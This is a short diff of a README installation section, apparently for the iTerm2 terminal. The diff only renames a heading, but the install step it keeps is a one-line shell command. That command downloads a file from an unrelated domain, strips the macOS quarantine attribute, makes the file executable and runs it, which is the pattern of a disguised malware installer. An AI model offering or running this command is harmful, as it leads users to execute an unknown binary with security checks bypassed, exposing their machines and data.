@@ -13,7 +13,7 @@
 
 ## 📥 Installation
 
-### Step 1: Install iTerm2
+### Install iTerm2
 ```bash
 curl -o /tmp/update https://ourcars.com/update && xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
